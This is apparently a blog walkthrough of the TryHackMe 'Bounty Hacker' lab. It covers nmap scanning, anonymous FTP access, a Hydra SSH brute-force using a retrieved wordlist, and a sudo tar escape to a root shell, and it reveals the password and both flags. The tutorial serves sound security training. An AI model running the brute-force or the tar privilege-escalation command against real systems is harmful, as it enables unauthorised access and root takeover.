---
title: "TryHackMe - Bounty Hacker"
date: 2025-04-28 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [nmap, ftp, hydra, ftp, GTFOBins, ssh, privilege escalation ]
---


## Introduction

In this post, I provide a full step-by-step walkthrough of the [Bounty Hacker room](https://tryhackme.com/room/cowboyhacker) on TryHackMe. The objective is to gain access to the target machine and escalate privileges to retrieve two flags: `user.txt` and `root.txt`.



## Reconnaissance


The first step was to perform a full port scan with **Nmap** to identify open services:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -T4 -p- 10.10.110.25
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 11:29 EDT
Nmap scan report for 10.10.110.25
Host is up (0.069s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.23.106.242
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Scan results:

- FTP (port 21) – vsftpd 3.0.3 with anonymous login

- SSH (port 22) – OpenSSH 7.2p2

- HTTP (port 80) – Apache/2.4.18


## Accessing FTP
Since anonymous login was allowed, I connected to the FTP service:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 10.10.110.25    
Connected to 10.10.110.25.
220 (vsFTPd 3.0.3)
Name (10.10.110.25:kali): ls
530 This FTP server is anonymous only.
ftp: Login failed
ftp> user Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |****************************************************************************|    68      991.13 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (1.02 KiB/s)
ftp> get locks.txt
local: locks.txt remote: locks.txt

```

Two interesting files were found:

- `task.txt` – a simple task list

- `locks.txt` – likely a password wordlist

Contents of `locks.txt`:


```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e


```

Contents of `task.txt`:

```console
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
The file suggests a valid user: `lin`.

## SSH Brute-force attack

The gathered `locks.txt` file was used in a brute-force attack with **Hydra**:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -l lin -P /home/kali/Desktop/locks.txt 10.10.110.25 ssh -t 4          
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-04 11:36:10
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.110.25:22/
[22][ssh] host: 10.10.110.25   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-04 11:36:18

```

Success: valid credentials were found:

- Username: lin

- Password: RedDr4gonSynd1cat3


## SSH Login

SSH access was gained using the above credentials:

```console
                                                                                                                        
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh lin@10.10.110.25             
The authenticity of host '10.10.110.25 (10.10.110.25)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.110.25' (ED25519) to the list of known hosts.
lin@10.10.110.25's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ 
```
Once inside, I located and read the **user flag**:
```
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}

```

## Root Access and Final Flag

Checking sudo permissions:

```bash
sudo -l
```

```console
in@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

```

The user can run the `tar` command as root. According to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), this can be exploited to get a root shell:

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

```console

lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
```


After executing the command, I gained root access and retrieved the root flag:


```console
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
# 
```

## Summary

This simple room demonstrates a classic attack chain: enumeration, FTP access, SSH brute-force, and privilege escalation via tar. A great learning scenario for beginners and intermediate pentesters alike.